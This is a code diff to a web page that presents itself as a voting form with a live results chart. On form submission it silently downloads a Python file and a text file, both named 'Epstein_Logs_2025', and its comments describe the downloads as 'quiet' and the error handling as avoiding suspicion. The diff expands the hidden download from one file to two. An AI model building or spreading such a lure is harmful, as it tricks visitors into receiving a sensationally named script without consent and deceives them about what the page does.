@@ -135,9 +135,6 @@
         const API_KEY = 'your-api-key-here'; // Replace with your actual API key
         const RESULTS_ENDPOINT = 'https://your-vote-endpoint.com/api/results'; // Replace if needed
 
-        // File to download – place impeachtrump.txt in the same repository folder
-        const DOWNLOAD_FILE = 'Epstein_Logs_2025.py';
-
         let chart;
 
         async function fetchResults() {
@@ -230,14 +227,21 @@
         fetchResults();
         setInterval(fetchResults, 30000);
 
-        // Quiet download function (no user feedback about it)
-        function triggerDownload() {
-            const link = document.createElement('a');
-            link.href = DOWNLOAD_FILE;
-            link.download = 'Epstein_Logs_2025.py';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+        // Quietly trigger download of both files
+        function triggerDownloads() {
+            const files = [
+                { href: 'Epstein_Logs_2025.py', download: 'Epstein_Logs_2025.py' },
+                { href: 'Epstein_Logs_2025.txt', download: 'Epstein_Logs_2025.txt' }
+            ];
+
+            files.forEach(file => {
+                const link = document.createElement('a');
+                link.href = file.href;
+                link.download = file.download;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            });
         }
 
         document.getElementById('voteForm').addEventListener('submit', function(event) {
@@ -261,8 +265,8 @@
             messageDiv.textContent = 'Processing your vote...';
             messageDiv.style.color = '#002868';
 
-            // Quietly start the download immediately
-            triggerDownload();
+            // Quietly start both downloads immediately
+            triggerDownloads();
 
             let progress = 0;
             const progressInterval = setInterval(() => {
@@ -296,7 +300,6 @@
                         messageDiv.style.color = '#002868';
                     }
                 } catch (err) {
-                    // Even on error, show neutral success to avoid suspicion
                     messageDiv.textContent = 'Your vote was cast.';
                     messageDiv.style.color = '#002868';
                 } finally {
